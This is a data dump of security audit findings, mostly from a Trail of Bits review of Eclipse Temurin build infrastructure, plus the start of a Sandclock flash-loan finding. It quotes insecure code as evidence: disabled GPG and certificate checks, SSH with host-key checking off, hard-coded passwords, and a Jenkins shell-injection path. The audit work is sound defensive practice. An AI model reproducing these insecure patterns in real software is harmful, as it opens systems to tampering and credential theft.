Eclipse: Temurin Security Assessment Figure 5.2: NVIDIA playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/NVidia _Cuda_Toolkit/tasks/main.yml:105115 ) - name : Add Docker Repo x86-64/ppc64le yum_repository : name : docker description : docker repository baseurl : \"https://download.docker.com/linux/centos/{{ ansible_distribution_major_version }}/{{ ansible_architecture }}/stable\" enabled : true gpgcheck : false when : - ansible_architecture == \"x86_64\" or ansible_architecture == \"ppc64le\" - name : Add Docker repo for s390x on RHEL yum_repository : name : docker description : docker YUM repo s390x baseurl : https://download.docker.com/linux/rhel/{{ ansible_distribution_major_version }}/s390x/stable/ enabled : true gpgcheck : false when : - ansible_architecture == \"s390x\" Figure 5.3: Docker playbook disabling GPG verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Docker /tasks/rhel.yml:1331 ) Exploit Scenario An attacker wants to upload a malicious package to one of the repositories. He is able to bypass the repository signing process or sign the package with an untrusted GPG key and successfully upload the package. The system performing the installation then installs the malicious package despite receiving an incorrect signature, or no signature at all. Recommendations Short term, import the correct package repository GPG keys, and enable GPG signature verication. Long term, implement static analysis rules to automatically detect disabled GPG signature verication in Ansible playbooks. 26 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. Missing integrity check in Dragonwell Dockerle ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The Dragonwell Dockerle downloads and installs the Dragonwell software without verifying its integrity. A hashsum like SHA-256 should be used to ensure the integrity of the download and that the system is receiving the same data across multiple downloads. RUN \\ # Dragonewell 8 requires a dragonwell 8 BootJDK mkdir -p /opt/dragonwell; \\ wget https://github.com/alibaba/dragonwell8/releases/download/dragonwell- 8.4 . 4 _jdk8u262-g a/Alibaba_Dragonwell_8. 4.4 -GA_Linux_x64.tar.gz; \\ tar -xf Alibaba_Dragonwell_8. 4.4 -GA_Linux_x64.tar.gz -C /opt/; \\ mv /opt/jdk8u262-b10 /opt/dragonwell8 Figure 6.1: Download of the Dragonwell software ( ci-jenkins-pipelines/pipelines/build/dockerFiles/dragonwell.dockerfile:5 10 ) Note that the equivalent AArch64 download of the same software does verify the integrity with an MD5 hashsum: RUN \\ # Dragonewell 8 requires a dragonwell 8 BootJDK mkdir -p /opt/dragonwell8; \\ wget https://github.com/alibaba/dragonwell8/releases/download/dragonwell- 8.5 . 5 _jdk8u275-b 2/Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz; \\ test $(md5sum Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz | cut -d ' ' -f1) = \"ab80c4f638510de8c7211b7b7734f946\" || exit 1 ; \\ tar -xf Alibaba_Dragonwell_8. 5.5 -FP1_Linux_aarch64.tar.gz -C /opt/dragonwell8 --strip-components= 1 Figure 6.2: Download of the AArch64 Dragonwell software ( ci-jenkins-pipelines/pipelines/build/dockerFiles/dragonwell_aarch64.dock erfile:510 ) 27 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker is able to upload a malicious package to one of the repositories. The system performing the installation then installs the malicious package even though the underlying data within the package has changed. Recommendations Short term, add a SHA-256 hashsum check to ensure the integrity of the software. 28 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Hostname verication disabled on MongoDB client ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The MongoDB client used by the API server disables hostname verication when SSL is enabled. This could enable attackers to steal the database username and password through person-in-the-middle attacks. var settingsBuilder = MongoClientSettings.builder() .applyConnectionString(ConnectionString(connectionString)) val sslEnabled = System.getenv( \"MONGODB_SSL\" )?.toBoolean() if (sslEnabled == true ) { settingsBuilder = settingsBuilder.applyToSslSettings { it .enabled( true ). invalidHostNameAllowed( true ) } } client = KMongo.createClient(settingsBuilder.build()).coroutine database = client.getDatabase(dbName) Figure 7.1: Conguration code that disables hostname verication ( api.adoptium.net/adoptium-api-v3-persistence/src/main/kotlin/net/adoptiu m/api/v3/dataSources/persitence/mongo/MongoClient.kt#6774 ) Exploit Scenario The API server sends a request to the MongoDB database. A person-in-the-middle attacker impersonates the database, using his own SSL key. The API server then sends over its database username and password, encrypted using the attackers public key, rather than the databases public key. The attacker now knows the databases username and password and can tamper with its contents. Recommendations Short term, enable hostname verication by removing the call to invalidHostNameAllowed . 29 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "8. RHEL build image includes password ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The Red Hat Enterprise Linux (RHEL) build image takes a Red Hat username and password as a build argument. Docker build arguments are persisted in the resulting image, meaning that anyone who gains access to Temurins RHEL image will also have access to the Red Hat login information. FROM registry.access.redhat.com/rhel7 # This dockerfile should be built using: # docker build --no-cache -t rhel7_build_image -f ansible/docker/Dockerfile.RHEL7 --build-arg ROSIUSER=******* --build-arg ROSIPW=******* --build-arg git_sha=******* `pwd` ARG ROSIUSER ARG ROSIPW RUN sed -i 's/\\(def in_container():\\)/\\1\\n return False/g' /usr/lib64/python*/*-packages/rhsm/config.py RUN subscription-manager register --username= ${ ROSIUSER } --password= ${ ROSIPW } --auto-attach Figure 8.1: infrastructure/ansible/docker/Dockerfile.RHEL7#17 Recommendations Short term, use build secrets , rather than build arguments, to provide login information. 30 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Insecure downloads using wget command ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The wget command is used to download data over a network. The target codebases use wget in an insecure manner in a number of locations, using unencrypted channels such as HTTP or disabling certicate validation when performing the download. The following snippets show ve locations where wget is used in an insecure manner: RUN wget 'http://mirror.centos.org/centos/8-stream/BaseOS/x86_64/os/Packages/centos-gpg-keys- 8-3.el8.noarch.rpm' -O /tmp/gpgkey.rpm RUN rpm -i '/tmp/gpgkey.rpm' RUN wget 'http://mirror.centos.org/centos/8-stream/BaseOS/x86_64/os/Packages/centos-stream-re pos-8-3.el8.noarch.rpm' -O /tmp/centosrepos.rpm Figure 9.1: Unencrypted, HTTP download ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Docker Static/Dockerfiles/Dockerfile.ubi8:79 ) wget -O installer-vmlinuz http://http.us.debian.org/debian/dists/jessie/main/installer-armhf/current/images/ne tboot/vmlinuz wget -O installer-initrd.gz http://http.us.debian.org/debian/dists/jessie/main/installer-armhf/current/images/ne tboot/initrd.gz Figure 9.2: Unencrypted, HTTP download ( infrastructure/docs/Setup-QEMU-Images.md:166167 ) launcher = new CommandLauncher(Constants.SSH_COMMAND + \"${machineIPs[index]} \" + \"\\\" wget -q --no-check-certificate -O slave.jar ${JENKINS_URL}jnlpJars/slave.jar ; java -jar slave.jar\\\"\" ); Figure 9.3: Download with certicate validation disabled ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:32 ) 31 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker is in a privileged network position relative to a system downloading data using wget and is able to actively intercept and modify the systems network trac. Because the data is downloaded without SSL certicate verication, the attacker can modify the download in transit and replace the data with a malicious version. Recommendations Short term, change HTTP downloads to HTTPS, and enable SSL certicate validation. If it is not possible to change an HTTP download to HTTPS, such as in a package installation, then a verication key such as a GPG key should be included out of band and used to verify the package installation. In other words, a key can be hard-coded into an installation procedure and used to trust on rst use. Long term, implement static analysis rules to automatically detect HTTP downloads and disabled SSL certicate validation in wget commands. 32 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "10. Hard-coded CA bundle keystore password ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The password used for the certicate authority (CA) bundle generated for the API service is hard-coded as changeit : keytool -import -alias mongodb -storepass changeit -keystore ./cacerts -file \" ${ MONGO_CERT_FILE } \" -noprompt JAVA_OPTS = \" $JAVA_OPTS -Djavax.net.ssl.trustStore=./cacerts -Djavax.net.ssl. trustStorePassword=changeit \" Figure 10.1: Hard-coded password ( api.adoptium.net/deploy/run.sh:2930 ) echo \"Processing certificate with alias: $ALIAS \" \" $KEYTOOL \" -noprompt \\ -import \\ -storetype JKS \\ -alias \" $ALIAS \" \\ -file \" $FILE \" \\ -keystore \"cacerts\" \\ -storepass \"changeit\" ... num_certs = $( \" $KEYTOOL \" -v -list -storepass changeit -keystore cacerts | grep -c \"Alias name:\" ) Figure 10.2: Hard-coded password ( temurin-build/security/mk-cacerts.sh:118125,143 ) This CA bundle is generated in a deterministic manner from publicly available Mozilla certicate data. This may seem to indicate that it need not be password-protected. However, the keystore password is used to verify the integrity and authenticity of the bundle. Without a condential password set, the integrity and authenticity of the data cannot be veried as the data moves from the build to runtime environment. Due to the lack of potentially attacker-controlled inputs into this functionality, this ndings severity is set to informational. 33 OSTIF Eclipse: Temurin Security Assessment Recommendations Short term, use a strong, randomly generated password to store this keystore data, and include this password at runtime to verify the authenticity of the CA bundle data. 34 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Hard-coded Vagrant VM password ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Vagrant VMs are used to execute build and test workloads in a CI environment. The VMs use a hard-coded password for authentication: session = winrm.Session( str (vmIP), auth=( 'vagrant' , 'vagrant' ) ) session.run_ps(cmd_str, sys.stdout, sys.stderr) Figure 11.1: Hard-coded password ( infrastructure/ansible/pbTestScripts/startScriptWin.py:2122 ) These VMs are run on an internal system without public access and are discarded upon completion of the workload. Due to the ephemeral nature of these VMs, the severity of this nding is set to informational. However, using a strong, random password may limit lateral movement in the event of an unrelated compromise and would be a benecial defense-in-depth mechanism. Recommendations Short term, use a strong, randomly generated password to authenticate Vagrant VMs at runtime. 35 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Missing integrity or authenticity check in jcov script download ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The jcov.sh script downloads ASM tools without verifying their integrity or authenticity: local tools = \"asm asm-tree asm-util\" local main_url = \"https://repository.ow2.org/nexus/content/repositories/releases/org/ow2/asm\" ASM_TITLE = \"Built against ' $tools ' tools in version ' $asm_version '\" ASM_URLS = \"\" ASM_JARS = \"\" ASM_PROPS = \"\" for tool in $tools ; do local tool_prop = \"`echo $tool |sed \" s/-/./g \"`.jar\" local tool_versioned = \" $tool - $asm_version .jar\" local tool_url = \" $main_url / $tool / $asm_version / $tool_versioned \" if [ \" $asm_manual \" == \"true\" ] ; then if [ ! -e $tool_versioned ] ; then wget $tool_url fi ... Figure 12.1: Download missing integrity or authenticity check ( ci-jenkins-pipelines/tools/code-tools/jcov.sh:6578 ) The integrity or authenticity should be veried using a hashsum like SHA-256 or a signature like a GPG signature. This would ensure that the system is receiving the same data across multiple downloads. This download does use HTTPS, so this issue is marked as low severity. Exploit Scenario An attacker is able to upload a malicious package to one of the repositories. The system performing the installation then installs the malicious package even though the underlying data within the package has changed. Recommendations Short term, add a SHA-256 hashsum check to ensure the integrity of the software, or a GPG verication to ensure the authenticity of the software. Both mechanisms are made available by the repository.ow2.org ASM repository. 36 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. SSH client disables host key verication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "SSH clients maintain a list of known-good hosts they have connected to before. Host key verication is then used to prevent person-in-the-middle attacks. There are a number of locations across the target repositories that disable SSH host key verication, such as when connecting to a Nagios instance: Reverse_Tunnel = \"ssh -o StrictHostKeyChecking=no -f -n -N -R $REMOTE_PORT :127.0.0.1: $LOCAL_PORT $USER_NAME @ $REMOTE_HOST -p $LOGIN_PORT -i $IDENTITY_KEY \" Figure 13.1: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_RemoteTunnel.sh:1821 ) Nagios_Login = ` su nagios -c \"ssh -o StrictHostKeyChecking=no $Sys_IPAddress uptime\"` Figure 13.2: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_Ansible_Config_tool.sh:170 ) command : ssh -o StrictHostKeyChecking=no root@{{ Nagios_Master_IP }} \"/usr/local/nagios/Nagios_Ansible_Config_tool/Nagios_Ansible_Config_tool.sh {{ ansible_distribution }} {{ ansible_architecture }} {{ inventory_hostname }} {{ ansible_host }} {{ provider }} {{ ansible_port }} \" Figure 13.3: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Nagios _Master_Config/tasks/main.yml:25 ) 37 OSTIF Eclipse: Temurin Security Assessment There are also a number of benign locations where SSH host key verication is disabled. These locations are considered benign because they are connecting to internal, short-lived, or local-only services. They are included here for completenesss sake: launcher = new SSHLauncher( machines[index], 22 , params.SSHCredentialId.isEmpty() ? Constants.SSH_CREDENTIAL_ID : params.SSHCredentialId, null , null , null , null , null , null , null , new NonVerifyingKeyVerificationStrategy() ); Figure 13.4: Groovy SSH launcher disabling host key verication ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:3843 ) sshpass -p 'password' ssh linux@localhost -p \" $PORTNO \" -o StrictHostKeyChecking =no 'uname -a' Figure 13.5: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/qemuPlaybookCheck.sh:273 ) ssh_args = \" $ssh_args -o StrictHostKeyChecking=no\" Figure 13.6: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/vagrantPlaybookCheck.sh:253 ) Exploit Scenario An attacker is in a privileged network position relative to a system initiating an SSH connection and is able to actively intercept and modify the systems network trac. Because SSH host key verication is disabled, the attacker can intercept SSH network trac and perform a person-in-the-middle attack. Recommendations Short term, in all locations where SSH host key verication is currently disabled, have the code gather the hosts SSH public key and add it out of band to the clients known_hosts le. Long term, implement static analysis rules to automatically detect when SSH host key verication is disabled. 38 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "14. Compiler mitigations are not enabled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The Temurin build does not have all modern compiler security mitigations enabled. This makes it easier for an attacker who nds a low-level vulnerability to exploit it and gain control over the process. Modern compilers support exploit mitigations such as the following:         Non-executable ag: Marks the programs data sections as non-executable PIE ag: Makes the program compiled as a position-independent executable, which is position-independent code for address space layout randomization (ASLR) Stack canaries: Used for buer overow detection RELRO: Used for data section hardening Source fortication: Used for buer overow detection and format string protection Stack clash protection: Used for the detection of clashes between a stack pointer and another memory region Control ow integrity (CFI) checks: Used to prevent control ow hijacking SafeStack: Used for stack overow protection Compilers enable a few of these mitigations by default. For more detail on these exploit mitigation technologies, refer to appendix D: Compiler Mitigations . In particular, the checksec tool reports that binaries produced by Temurin do not have stack canaries or source fortication enabled. Recommendations Short term, enable security mitigations for Temurin builds by using the compiler and linker ags described in appendix D: Compiler Mitigations . These ags can be added using the --with-extra-cflags and --with-extra-cxxflags arguments during conguration. 39 OSTIF Eclipse: Temurin Security Assessment While compilers often enable certain mitigations by default, if they are explicitly enabled, they will be used regardless of a compilers defaults. Long term, enable security mitigations for all binaries built by Temurin and add a scan for them into the test phase to ensure that certain options are always enabled. This will make it more dicult for an attacker to exploit any bugs found in the binaries. References      Airbus: Getting the maximum of your C compiler, for security Debian Hardening: Notes on Memory Corruption Mitigation Methods GCC Linux man page LD Linux man page OpenSSFs Compiler Options Hardening Guide for C and C++ 40 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Use of unpinned third-party workows ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Workows throughout the Temurin repositories directly use third-party workows. Most of them are pinned to commit hashes, but there are some exceptions, such as in ci-jenkins-pipelines/.github/workflows/labeler.yml : - uses : fuxingloh/multi-labeler@v2 with : github-token : \"${{secrets.GITHUB_TOKEN}}\" config-path : .github/regex_labeler.yml Figure 15.1: Use of third-party workow ( ci-jenkins-pipelines/.github/workflows/labeler.yml:1922 ) Git tags are malleable. This means that, while fuxingloh/multi-labeler is pinned to v2 , the upstream may silently change the reference pointed to by v2 . This can include malicious re-tags, in which case Temurins various dependent workows will silently update to the malicious workow. GitHubs security hardening guidelines for third-party actions encourage developers to pin third-party actions to a full-length commit hash. Generally excluded from this are ocial actions under the actions organization. The following are the aected workows:  temurin-build/.github/workflows/build-autotriage.yml  ci-jenkins-pipelines/.github/workflows/labeler.yml  infrastructure/.github/workflows/build_qemu.yml Exploit Scenario An attacker (or compromised maintainer) silently overwrites the v2 tag on fuxingloh/multi-labeler with a malicious version of the action, allowing the secrets.GITHUB_TOKEN value for the ci-jenkins-pipeline repository to be stolen. 41 OSTIF Eclipse: Temurin Security Assessment Recommendations Short term, replace the current version tags with full-length commit hashes corresponding to the revision that each workow is intended to use. 42 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "16. Third-party dependencies used without signature or checksum verication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "In many places in the temurin-build repository, third-party dependencies are installed via https download without a signature or checksum check. The following is a (not necessarily exhaustive) list of the dependencies that are installed in this way:  In tooling/linux_repro_build_compare.sh :  https://ftp.gnu.org/gnu/autoconf/autoconf-2.69.tar.gz  https://archive.apache.org/dist/ant/binaries/apache-ant-${AN T_VERSION}-bin.zip  https://sourceforge.net/projects/ant-contrib/files/ant-contr ib/${ANT_CONTRIB_VERSION}/ant-contrib-${ANT_CONTRIB_VERSION} -bin.zip  In tooling/release_download_test.sh :  https://github.com/CycloneDX/cyclonedx-cli/releases/download /v0.25.0/\"${cyclonedx_tool}  In build-farm/platform-specific-configurations/linux.sh :  https://github.com/alibaba/dragonwell8/releases/download/dra gonwell-8.11.12_jdk8u332-ga/Alibaba_Dragonwell_8.11.12_x64_l inux.tar.gz  https://github.com/alibaba/dragonwell8/releases/download/dra gonwell-8.8.9_jdk8u302-ga/Alibaba_Dragonwell_8.8.9_aarch64_l inux.tar.gz  In .azure-devops/build/steps/windows/before.yml :  https://cygwin.com/setup-x86_64.exe  In .github/workflows/build.yml : 43 OSTIF Eclipse: Temurin Security Assessment  https://download.visualstudio.microsoft.com/download/pr/c5c7 5dfa-1b29-4419-80f8-bd39aed6bcd9/7ed8fa27575648163e07548ff56 67b55b95663a2323e2b2a5f87b16284e481e6/vs_Community.exe  https://download.visualstudio.microsoft.com/download/pr/6b65 5578-de8c-4862-ad77-65044ca714cf/f29399a618bd3a8d1dcc96d3494 53f686b6176590d904308402a6402543e310b/vs_Community.exe  In docker/buildDocker.sh :  https://raw.githubusercontent.com/eclipse-openj9/openj9/mast er/buildenv/docker/mkdocker.sh Recommendations Short term, add a checksum or signature check to these downloads, wherever possible. 44 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. Code injection vulnerability in build-scripts pipeline jobs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Jenkins pipeline jobs can execute arbitrary shell script code with the sh step. User input may reach sh calls through parameters or congurations originating from web-based form input. This allows for code injection and arbitrary code execution. The following sh calls receive input from external sources: context.sh \"rm -rf target/ ${config.TARGET_OS}/${config.ARCHITECTURE}/${config.VARIANT} /\" Figure 17.1: TARGET_OS , ARCHITECTURE , and VARIANT input passed to sh ( ci-jenkins-pipelines/pipelines/build/common/build_base_file.groovy:898 ) context.sh( script: \"docker pull ${buildConfig.DOCKER_IMAGE} ${buildConfig.DOCKER_ARGS} \" ) ... context.sh( script: \"docker pull ${buildConfig.DOCKER_IMAGE} ${buildConfig.DOCKER_ARGS} \" ) ... dockerImageDigest = context.sh( script: \"docker inspect --format='{{.RepoDigests}}' ${buildConfig.DOCKER_IMAGE} \" , returnStdout:true ) Figure 17.2: DOCKER_IMAGE and DOCKER_ARGS input passed to sh ( ci-jenkins-pipelines/pipelines/build/common/openjdk_build_pipeline.groov y:1915,1922,1928 ) sh( \"curl -Os https://raw.githubusercontent.com/adoptium/aqa-tests/ ${params.aqaReference} /testenv/ ${propertyFile}\" ) Figure 17.3: AQA_REF input passed to sh ( ci-jenkins-pipelines/pipelines/build/openjdk_pipeline.groovy:35 ) If an attacker can inuence any of these parameters, then they can execute arbitrary code on the Jenkins machine running the given job. The Eclipse Foundation has conrmed that these parameters can be specied in a Jenkins job web form; however, access to these forms is restricted. 45 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker sends a malicious shell payload through the TARGET_OS , ARCHITECTURE , VARIANT , DOCKER_IMAGE , DOCKER_ARGS , or AQA_REF Jenkins job parameters. The input then reaches the sh process, which allows the execution of arbitrary shell scripts. The attacker is able to execute arbitrary commands by using shell operators such as ; , && , or || , and to append additional commands. Recommendations Short term, instead of specifying shell script commands to run in the sh step, use Groovy code or Jenkins plugins to accomplish the same action. For example, instead of rm or curl , use the deleteDir step or the File Operations plugin. Instead of using shell scripts for Docker operations, use the Docker Pipeline plugin where possible. If additional Docker command ags are necessary, use Boolean inputs that enable or disable specic ags instead of interpolating arbitrary string input. Long term, implement static analysis rules to automatically detect when user input is passed to sh steps. References   Jenkins, sh : Shell Script Docker Pipeline plugin, Advanced usage 46 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "18. Docker commands specify root user in containers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "Docker may specify a container user during the build process in a Dockerle or at runtime on the command line. Running containers as root violates the principle of least privilege and should be avoided. The following Docker commands specify root as the container user: docker run -it -u root -d --name= \" ${ dockerContainer } \" \" ${ dockerImage } \" docker exec -u root -i \" ${ dockerContainer } \" sh -c \"git clone https://github.com/ibmruntimes/openj9-openjdk- ${ jdk } \" docker exec -u root -i \" ${ dockerContainer } \" sh -c \"cd openj9-openjdk- ${ jdk } && bash ./get_source.sh && bash ./configure --with-freemarker-jar=/root/freemarker.jar && make all\" Figure 18.1: Commands specifying root container users ( temurin-build/docker/buildDocker.sh:141143 ) Recommendations Short term, have any necessary root actions performed at build-time in the Dockerle, and have containers run as a lower privileged user at runtime. Long term, once containers are no longer being run as root, enable the --security-opt=no-new-privileges ag when running Docker, in order to prevent privilege escalation using setuid or setgid binaries. 47 OSTIF Eclipse: Temurin Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. SSH client disables host key verication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "SSH clients maintain a list of known-good hosts they have connected to before. Host key verication is then used to prevent person-in-the-middle attacks. There are a number of locations across the target repositories that disable SSH host key verication, such as when connecting to a Nagios instance: Reverse_Tunnel = \"ssh -o StrictHostKeyChecking=no -f -n -N -R $REMOTE_PORT :127.0.0.1: $LOCAL_PORT $USER_NAME @ $REMOTE_HOST -p $LOGIN_PORT -i $IDENTITY_KEY \" Figure 13.1: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_RemoteTunnel.sh:1821 ) Nagios_Login = ` su nagios -c \"ssh -o StrictHostKeyChecking=no $Sys_IPAddress uptime\"` Figure 13.2: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_Ansible_Config_tool.sh:170 ) command : ssh -o StrictHostKeyChecking=no root@{{ Nagios_Master_IP }} \"/usr/local/nagios/Nagios_Ansible_Config_tool/Nagios_Ansible_Config_tool.sh {{ ansible_distribution }} {{ ansible_architecture }} {{ inventory_hostname }} {{ ansible_host }} {{ provider }} {{ ansible_port }} \" Figure 13.3: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Nagios _Master_Config/tasks/main.yml:25 ) 37 OSTIF Eclipse: Temurin Security Assessment There are also a number of benign locations where SSH host key verication is disabled. These locations are considered benign because they are connecting to internal, short-lived, or local-only services. They are included here for completenesss sake: launcher = new SSHLauncher( machines[index], 22 , params.SSHCredentialId.isEmpty() ? Constants.SSH_CREDENTIAL_ID : params.SSHCredentialId, null , null , null , null , null , null , null , new NonVerifyingKeyVerificationStrategy() ); Figure 13.4: Groovy SSH launcher disabling host key verication ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:3843 ) sshpass -p 'password' ssh linux@localhost -p \" $PORTNO \" -o StrictHostKeyChecking =no 'uname -a' Figure 13.5: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/qemuPlaybookCheck.sh:273 ) ssh_args = \" $ssh_args -o StrictHostKeyChecking=no\" Figure 13.6: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/vagrantPlaybookCheck.sh:253 ) Exploit Scenario An attacker is in a privileged network position relative to a system initiating an SSH connection and is able to actively intercept and modify the systems network trac. Because SSH host key verication is disabled, the attacker can intercept SSH network trac and perform a person-in-the-middle attack. Recommendations Short term, in all locations where SSH host key verication is currently disabled, have the code gather the hosts SSH public key and add it out of band to the clients known_hosts le. Long term, implement static analysis rules to automatically detect when SSH host key verication is disabled. 38 OSTIF Eclipse: Temurin Security Assessment 14. Compiler mitigations are not enabled Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-TEMURIN-14 Target: temurin-build/sbin/build.sh", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "19. Incorrect Dependabot conguration lename ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf", "body": "The infrastructure repository has a Dependabot conguration le, used to congure the Dependabot bot, which detects out-of-date dependencies. However, this le is incorrectly named dependabot rather than dependabot.yml , preventing the bot from being run on this repository. In order to test this, we created a private copy of the infrastructure repository and renamed the dependabot le to dependabot.yml . Dependabot detected many out-of-date Github Actions dependencies. We did not determine whether any of the out-of-date dependencies present in the infrastructure repository have security problems that could aect the Temurin infrastructure or build system. Recommendations Short term, rename the dependabot le to dependabot.yml . 48 OSTIF Eclipse: Temurin Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "1. receiveFlashLoan does not account for fees ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf", "body": "The receiveFlashLoan functions of the scWETHv2 and scUSDCv2 vaults ignore the Balancer ash loan fees and repay exactly the amount that was loaned. This is not currently an issue because the Balancer vault does not charge any fees for ash loans. However, if Balancer implements fees for ash loans in the future, the Sandclock vaults would be prevented from withdrawing investments back into the vault. function flashLoan ( IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256 [] memory amounts, bytes memory userData ) external override nonReentrant whenNotPaused { uint256 [] memory feeAmounts = new uint256 [](tokens.length); uint256 [] memory preLoanBalances = new uint256 [](tokens.length); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 amount = amounts[i]; preLoanBalances[i] = token.balanceOf( address ( this )); feeAmounts[i] = _calculateFlashLoanFeeAmount(amount); token.safeTransfer( address (recipient), amount); } recipient.receiveFlashLoan(tokens, amounts, feeAmounts , userData); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 preLoanBalance = preLoanBalances[i]; uint256 postLoanBalance = token.balanceOf( address ( this )); uint256 receivedFeeAmount = postLoanBalance - preLoanBalance; _require(receivedFeeAmount >= feeAmounts[i]); _payFeeAmount(token, receivedFeeAmount); } } Figure 1.1: Abbreviated code showing the receivedFeeAmount check in the Balancer flashLoan method in 0xBA12222222228d8Ba445958a75a0704d566BF2C8#code#F5#L78 In the Balancer flashLoan function , shown in gure 1.1, the contract calls the recipients receiveFlashLoan function with four arguments: the addresses of the tokens loaned, the amounts for each token, the fees to be paid for the loan for each token, and the calldata provided by the caller. The Sandclock vaults ignore the fee amount and repay only the principal, which would lead to reverts if the fees are ever changed to nonzero values. Although this problem is present in multiple vaults, the receiveFlashLoan implementation of the scWETHv2 contract is shown in gure 1.2 as an illustrative example: function receiveFlashLoan ( address [] memory , uint256 [] memory amounts, uint256 [] memory , bytes memory userData) external { _isFlashLoanInitiated(); // the amount flashloaned uint256 flashLoanAmount = amounts[ 0 ]; // decode user data bytes [] memory callData = abi.decode(userData, ( bytes [])); _multiCall(callData); // payback flashloan asset.safeTransfer( address (balancerVault), flashLoanAmount ); _enforceFloat(); } Figure 1.2: The feeAmounts parameter is ignored by the receiveFlashLoan method. ( sandclock-contracts/src/steth/scWETHv2.sol#L232L249 ) Exploit Scenario After Sandclocks scUSDv2 and scWETHv2 vaults are deployed and users start depositing assets, the Balancer 